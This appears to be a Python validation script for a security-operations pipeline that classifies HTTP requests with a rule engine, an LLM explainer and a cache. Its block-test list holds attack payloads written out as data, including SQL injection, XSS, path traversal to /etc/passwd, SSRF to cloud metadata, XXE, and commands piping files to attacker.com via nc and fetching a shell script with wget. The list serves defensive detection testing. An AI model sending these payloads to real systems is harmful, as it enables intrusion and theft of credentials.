import sys
import time
import requests
from collections import Counter
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))

from graph_app import soc_app
from backends.rule_engine import analyze_request
from backends.cache_backend import _CACHE, _save_cache


def build_requests() -> list[str]:
    fast_allow = [
        "GET /health HTTP/1.1",
        "GET /ready HTTP/1.1",
        "GET /livez HTTP/1.1",
        "GET /metrics HTTP/1.1",
        "GET /favicon.ico HTTP/1.1",
        "GET /assets/main.css HTTP/1.1",
        "GET /assets/app.js HTTP/1.1",
        "GET /images/logo.png HTTP/1.1",
        "GET /docs/index.html HTTP/1.1",
        "GET /api/v1/users?page=1&limit=20 HTTP/1.1",
        "GET /api/v1/orders/123 HTTP/1.1",
        "GET /api/v2/products?category=laptop HTTP/1.1",
        "HEAD /api/v1/users HTTP/1.1",
        "OPTIONS /api/v1/login HTTP/1.1",
        "GET /status HTTP/1.1",
        "GET /healthz HTTP/1.1",
        "GET /api/v1/search?q=mouse HTTP/1.1",
        "GET /api/v1/invoices/7788 HTTP/1.1",
        "GET /api/v1/notifications?unread=true HTTP/1.1",
        "GET /api/v1/profile/42 HTTP/1.1",
    ]

    fast_block = [
        "GET /users?id=1 UNION SELECT password FROM users HTTP/1.1",
        "POST /login HTTP/1.1\n\nusername=admin' OR '1'='1&password=x",
        "GET /search?q=<script>alert(1)</script> HTTP/1.1",
        "GET /file?path=../../../../etc/passwd HTTP/1.1",
        "POST /exec HTTP/1.1\n\ncmd=cat /etc/passwd | nc attacker.com 4444",
        "GET /?url=http://169.254.169.254/latest/meta-data HTTP/1.1",
        "GET /?redirect=https://evil.example.com HTTP/1.1",
        "GET /?q=javascript:alert(document.cookie) HTTP/1.1",
        "GET /?x=%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1",
        "GET /download?f=..\\..\\..\\Windows\\system.ini HTTP/1.1",
        "GET /admin?u=1;wget http://evil/a.sh|sh HTTP/1.1",
        "POST /search HTTP/1.1\n\nq='; DROP TABLE users; --",
        "GET /?next=//evil.com HTTP/1.1",
        "GET /?a=${7*7} HTTP/1.1",
        "GET /?dest=http://127.0.0.1:8080/internal HTTP/1.1",
        "GET /?payload=<svg onload=alert(1)> HTTP/1.1",
        "GET /api?path=%2e%2e%2f%2e%2e%2fetc%2fshadow HTTP/1.1",
        "GET /?x=file:///etc/passwd HTTP/1.1",
        "POST /xml HTTP/1.1\n\n<!ENTITY xxe SYSTEM 'file:///etc/passwd'>",
        "GET /?q=UNION ALL SELECT @@version HTTP/1.1",
    ]

    slow_candidates = [
        "q=",
        "name=abc",
        "search=select",
        "/api/users?page=1",
        "abc123",
        "OR 1=1",
        "foo bar",
        "hello security team",
        "request id: 9921",
        "note=please review this unusual string",
    ]

    return fast_allow + fast_block + slow_candidates


def analyze_expected(reqs: list[str]):
    expected = []
    for req in reqs:
        r = analyze_request(req)
        expected.append({
            "request": req,
            "decision": r.get("fast_decision"),
            "attack_type": r.get("attack_type"),
            "score": r.get("inbound_anomaly_score"),
        })
    return expected


def validate_first_run(expected, result):
    errors = []
    items = result.get("items", [])
    outputs = result.get("result_json", {}).get("results", [])

    if len(items) != len(expected):
        errors.append(f"items length mismatch: got {len(items)} expected {len(expected)}")
    if len(outputs) != len(expected):
        errors.append(f"outputs length mismatch: got {len(outputs)} expected {len(expected)}")

    for idx, exp in enumerate(expected):
        if idx >= len(items) or idx >= len(outputs):
            break
        item = items[idx]
        out = outputs[idx]
        dec = exp["decision"]

        if item.get("cache_hit"):
            errors.append(f"[{idx}] unexpected cache_hit=True on first run")

        if dec == "BLOCK":
            if not item.get("blocked"):
                errors.append(f"[{idx}] expected blocked=True for BLOCK decision")
            if out.get("source") != "rule_engine":
                errors.append(f"[{idx}] expected source=rule_engine for BLOCK fast path, got {out.get('source')}")

        elif dec == "ALLOW":
            if item.get("blocked"):
                errors.append(f"[{idx}] expected blocked=False for ALLOW decision")
            if out.get("source") != "rule_engine":
                errors.append(f"[{idx}] expected source=rule_engine for ALLOW, got {out.get('source')}")

        elif dec in ("REVIEW", "MONITOR"):
            llm_output = item.get("llm_output") or {}
            if not isinstance(llm_output, dict) or not llm_output.get("analysis"):
                errors.append(f"[{idx}] expected llm_output.analysis for slow path")
            if out.get("source") != "llm_explainer":
                errors.append(f"[{idx}] expected source=llm_explainer for slow path, got {out.get('source')}")

    return errors


def validate_second_run(result):
    errors = []
    items = result.get("items", [])
    for idx, item in enumerate(items):
        if not item.get("cache_hit"):
            errors.append(f"[{idx}] expected cache_hit=True on second run")
    return errors


def summarize(result):
    items = result.get("items", [])
    outputs = result.get("result_json", {}).get("results", [])
    return {
        "blocked": sum(1 for i in items if i.get("blocked")),
        "cache_hit": sum(1 for i in items if i.get("cache_hit")),
        "decision_counts": dict(Counter(i.get("fast_decision") for i in items)),
        "route_counts": dict(Counter(o.get("route") for o in outputs)),
        "source_counts": dict(Counter(o.get("source") for o in outputs)),
        "event_counts": dict(Counter(o.get("event_type") for o in outputs)),
    }


def check_http_endpoint(batch_reqs):
    payload = {"requests": batch_reqs}
    try:
        t0 = time.time()
        r = requests.post("http://localhost:8000/analyze", json=payload, timeout=120)
        dt = time.time() - t0
        return {
            "ok": r.status_code == 200,
            "status": r.status_code,
            "elapsed": round(dt, 3),
            "body": r.text[:500],
        }
    except Exception as e:
        return {"ok": False, "status": None, "elapsed": None, "body": str(e)}


def main():
    reqs = build_requests()
    assert len(reqs) == 50

    expected = analyze_expected(reqs)
    expected_decisions = Counter(e["decision"] for e in expected)

    # Clear cache before first run
    _CACHE.clear()
    _save_cache()

    t0 = time.time()
    run1 = soc_app.invoke({"requests": reqs})
    t1 = time.time() - t0

    errors_run1 = validate_first_run(expected, run1)
    summary1 = summarize(run1)

    # Second run: should come from cache
    t0 = time.time()
    run2 = soc_app.invoke({"requests": reqs})
    t2 = time.time() - t0

    errors_run2 = validate_second_run(run2)
    summary2 = summarize(run2)

    http_check = check_http_endpoint(reqs)

    print("=" * 100)
    print("FULL FLOW VALIDATION REPORT")
    print("=" * 100)
    print(f"Total requests: {len(reqs)}")
    print(f"Expected rule decisions: {dict(expected_decisions)}")
    print("\n[Run #1 - In-process graph]")
    print(f"Elapsed: {t1:.3f}s")
    print(f"Summary: {summary1}")
    print(f"Validation errors: {len(errors_run1)}")
    for e in errors_run1[:20]:
        print("  -", e)

    print("\n[Run #2 - In-process graph, cache expected]")
    print(f"Elapsed: {t2:.3f}s")
    print(f"Summary: {summary2}")
    print(f"Validation errors: {len(errors_run2)}")
    for e in errors_run2[:20]:
        print("  -", e)

    print("\n[HTTP endpoint check: http://localhost:8000/analyze]")
    print(http_check)

    overall_ok = (len(errors_run1) == 0 and len(errors_run2) == 0)
    print("\nOverall in-process flow validation:", "PASS" if overall_ok else "FAIL")


if __name__ == "__main__":
    main()
